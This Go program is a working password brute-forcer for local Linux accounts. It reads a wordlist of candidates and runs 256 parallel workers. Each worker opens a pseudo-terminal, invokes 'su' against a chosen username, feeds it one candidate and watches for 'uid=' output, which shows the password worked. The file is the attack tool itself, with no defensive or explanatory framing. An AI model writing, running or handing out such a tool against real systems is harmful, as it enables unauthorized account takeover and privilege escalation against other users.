package main

import (
	"bufio"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"unsafe"

	"golang.org/x/sys/unix"
)

func main() {
	log.SetFlags(0)
	if len(os.Args) < 3 {
		log.Fatal("args: username passwordfile")
	}

	username := os.Args[1]
	passwordFile := os.Args[2]
	batchSize := 256

	tasks := make(chan string, batchSize)
	var wg sync.WaitGroup

	for i := 0; i < batchSize; i++ {
		wg.Add(1)
		go func() {
			pty, tty, err := open()
			if err != nil {
				log.Fatal(err)
			}
			defer tty.Close()
			defer pty.Close()

			for candidate := range tasks {
				testCandidate(username, candidate, pty, tty)
			}
			wg.Done()
		}()
	}

	processPasswords(passwordFile, tasks)

	close(tasks)
	wg.Wait()
}

func processPasswords(passwordFile string, tasks chan string) {
	file, err := os.Open(passwordFile)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	count := 0

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		tasks <- scanner.Text()
		count++
		if count%1000 == 0 {
			log.Printf("%d candidates tested\n", count)
		}
	}
}

func testCandidate(username, candidate string, pty, tty *os.File) {
	c := exec.Command("su", "-c", "id", username)
	defer c.Wait()
	c.Stdout = tty
	c.Stderr = tty
	c.Stdin = tty

	if err := c.Start(); err != nil {
		log.Fatal(err)
	}

	buffer := make([]byte, 30)
	pty.Read(buffer) // text 'Password: '
	pty.Write([]byte(candidate + "\n"))
	pty.Read(buffer)         // new line
	n, _ := pty.Read(buffer) // either id text or failure

	if n > 0 && strings.HasPrefix(string(buffer), "uid=") {
		log.Printf("success with %s\n", candidate)
		os.Exit(0)
	}
}

func open() (pty, tty *os.File, err error) {
	p, err := os.OpenFile("/dev/ptmx", os.O_RDWR, 0)
	if err != nil {
		return nil, nil, err
	}
	// In case of error after this point, make sure we close the ptmx fd.
	defer func() {
		if err != nil {
			_ = p.Close() // Best effort.
		}
	}()

	sname, err := ptsname(p)
	if err != nil {
		return nil, nil, err
	}

	if err := unlockpt(p); err != nil {
		return nil, nil, err
	}

	t, err := os.OpenFile(sname, os.O_RDWR|unix.O_NOCTTY, 0)
	if err != nil {
		return nil, nil, err
	}
	return p, t, nil
}

func ptsname(f *os.File) (string, error) {
	var n uint
	err := ioctl(f.Fd(), unix.TIOCGPTN, uintptr(unsafe.Pointer(&n)))
	if err != nil {
		return "", err
	}
	return "/dev/pts/" + strconv.Itoa(int(n)), nil
}

func unlockpt(f *os.File) error {
	var u uint
	// use TIOCSPTLCK with a pointer to zero to clear the lock
	return ioctl(f.Fd(), unix.TIOCSPTLCK, uintptr(unsafe.Pointer(&u)))
}

func ioctl(fd, cmd, ptr uintptr) error {
	_, _, e := unix.Syscall(unix.SYS_IOCTL, fd, cmd, ptr)
	if e != 0 {
		return e
	}
	return nil
}
